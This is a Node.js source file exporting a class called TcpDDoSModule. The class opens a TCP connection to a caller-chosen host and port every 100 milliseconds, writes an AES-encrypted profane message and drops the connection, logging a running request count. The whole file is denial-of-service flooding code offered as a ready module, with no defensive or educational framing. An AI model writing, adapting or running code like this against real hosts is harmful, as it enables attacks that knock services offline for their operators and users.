const { Socket } = require("net");
const CryptoJS = require("crypto-js");

class TcpDDoSModule {
  #host = "";
  #port = 0;
  #requestCount = 0;

  constructor(host, port) {
    this.client = new Socket();
    this.#host = host;
    this.#port = port;
  }

  async init() {
    setInterval(this._makeRequest.bind(this), 100);
  }

  _makeRequest() {
    const connection = { host: this.#host, port: this.#port };

    this.client.connect(connection, this._tcpConnect.bind(this));
    this.client.on("error", this._tcpError.bind(this));
  }

  async _tcpConnect() {
    console.log("[Info]: TCP connection is ready");

    const message = CryptoJS.AES.encrypt("Fuck you asshole", (new Date()).valueOf().toString()).toString();

    await this.client.write(message);
    this._destroyClient();

    console.log(`[Request]: Host: ${this.#host}, Port: ${this.#port}, Requests: ${this.#requestCount}`);
    this.#requestCount++;
  }

  _tcpError(err) {
    console.log("[Error]:", err.message);
    this._destroyClient();
  }

  _destroyClient() {
    this.client.destroy();
    this.client = new Socket();
  }
}

module.exports = TcpDDoSModule;
